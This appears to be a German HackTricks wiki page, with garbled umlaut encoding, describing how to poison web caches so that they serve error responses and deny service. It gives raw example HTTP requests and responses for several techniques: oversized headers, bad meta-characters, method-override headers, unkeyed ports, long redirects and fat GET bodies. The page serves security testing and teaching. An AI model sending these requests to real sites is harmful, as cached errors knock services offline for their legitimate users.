# Cache Poisoning to DoS

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

{% hint style="danger" %}
Auf dieser Seite finden Sie verschiedene Variationen, um zu versuchen, den **Webserver dazu zu bringen, mit Fehlern** auf Anfragen zu reagieren, die **g√ºltig f√ºr die Cache-Server sind**
{% endhint %}

* **HTTP Header Oversize (HHO)**

Senden Sie eine Anfrage mit einer Headergr√∂√üe, die gr√∂√üer ist als die vom Webserver unterst√ºtzte, aber kleiner als die vom Cache-Server unterst√ºtzte. Der Webserver wird mit einer 400-Antwort antworten, die m√∂glicherweise zwischengespeichert wird:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP-Meta-Zeichen (HMC) & Unerwartete Werte**

Senden Sie einen Header, der einige **sch√§dliche Meta-Zeichen** wie < und > enth√§lt. Damit der Angriff funktioniert, m√ºssen Sie zuerst den Cache umgehen.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
Ein schlecht konfiguriertes Header k√∂nnte einfach `\:` als Header sein.

Dies k√∂nnte auch funktionieren, wenn unerwartete Werte gesendet werden, wie ein unerwartetes Content-Type:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Unkeyed header**

Einige Websites geben einen Fehlerstatuscode zur√ºck, wenn sie **bestimmte Header i**n der Anfrage sehen, wie mit dem _X-Amz-Website-Location-Redirect: someThing_ Header:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTP Method Override Attack (HMO)**

Wenn der Server das √Ñndern der HTTP-Methode mit Headern wie `X-HTTP-Method-Override`, `X-HTTP-Method` oder `X-Method-Override` unterst√ºtzt, ist es m√∂glich, eine g√ºltige Seite anzufordern, indem die Methode ge√§ndert wird, sodass der Server sie nicht unterst√ºtzt und eine fehlerhafte Antwort zwischengespeichert wird:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Unkeyed Port**

Wenn der Port im Host-Header in der Antwort reflektiert wird und nicht im Cache-Schl√ºssel enthalten ist, ist es m√∂glich, ihn auf einen ungenutzten Port umzuleiten:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Long Redirect DoS**

Wie im folgenden Beispiel wird x nicht zwischengespeichert, sodass ein Angreifer das Verhalten der Umleitungsantwort ausnutzen k√∂nnte, um die Umleitung eine URL so gro√ü senden zu lassen, dass sie einen Fehler zur√ºckgibt. Dann erhalten Personen, die versuchen, die URL ohne den nicht zwischengespeicherten x-Schl√ºssel aufzurufen, die Fehlerantwort:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Normalisierung der Gro√ü- und Kleinschreibung des Host-Headers**

Der Host-Header sollte nicht zwischen Gro√ü- und Kleinschreibung unterscheiden, aber einige Websites erwarten, dass er in Kleinbuchstaben geschrieben ist und geben einen Fehler zur√ºck, wenn dies nicht der Fall ist:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Pfadnormalisierung**

Einige Seiten geben Fehlercodes zur√ºck, wenn Daten URLencode im Pfad gesendet werden, jedoch wird der Cache-Server den Pfad URLdecode und die Antwort f√ºr den URLdecoded Pfad speichern:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

Einige Cache-Server, wie Cloudflare, oder Webserver, stoppen GET-Anfragen mit einem Body, sodass dies missbraucht werden k√∂nnte, um eine ung√ºltige Antwort zu cachen:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## Referenzen

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos sendest.

</details>
{% endhint %}
